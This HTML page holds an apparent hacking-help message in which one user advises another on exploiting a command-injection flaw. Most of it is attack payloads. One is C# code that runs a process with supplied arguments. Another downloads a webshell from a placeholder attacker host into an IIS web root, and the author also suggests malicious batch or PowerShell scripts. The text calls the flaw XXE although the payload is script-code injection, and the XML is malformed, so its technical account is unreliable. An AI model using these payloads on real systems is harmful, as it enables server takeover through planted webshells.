<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Suggestion by</title>
</head><body><span style="font-size: 15pt"><br/>
<br/>
Hey K1NGCR1MS0N, hope all is well! You're on the right track for sure. The command injection is indeed very limited hahaha it's one of those annoying limitatiions. Let's dissect the vulnerability at hand.<br/>
<b>FNGCrysis<br/>
</b><b>FNGCrysis 12:18PM</b><br/>
<br/>
When you look at the payload, this is definitely an XXE vulnerability. Let's consider the following payload belonging to the script.<br/>
<br/>
&lt;?xml version="1.0"?&gt;public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \<br/>
<br/>
This payload is using C# to execute a process with args, but for some reason most args seem to cause some kind of escape issue when parsed. However, we can use a different payload to achieve other effects.<br/>
<br/>
For example, consider the following example from:<br/>
<b>https://owasp.org/www-chapter-pune/XXE_Exploitation.pdf</b><br/>
<br/>
&lt;?xml version='1.0'?&gt;<br/>
<br/>
<br/>
&lt;![CDATA[ public string xml() { System.Net.WebClient webClient = new System.Net.WebClient(); webClient.DownloadFile("https://ATTACKERHOST/webshell.aspx", @c:\inetpub\wwwroot\zephrShell.aspx); return "Shell Uploaded Successfully @ /zephrShell.aspx"; } ]]&gt;<br/>
<br/>
<br/>
<br/>
<br/>
This example can be used to upload a file such as a webshell to any directory as long as the current user has permissions. I will be the first to tell you that you can go down many paths with this. I found two working ways: 1. upload a webshell (be aware of how the aplication actually works and where shit goes) and 2. perhaps an evil batch file or powershell script.<br/>
<br/>
Hope this helps!<br/>
<br/>
<b>-FNGCrysis</b><br/>
</span></body></html>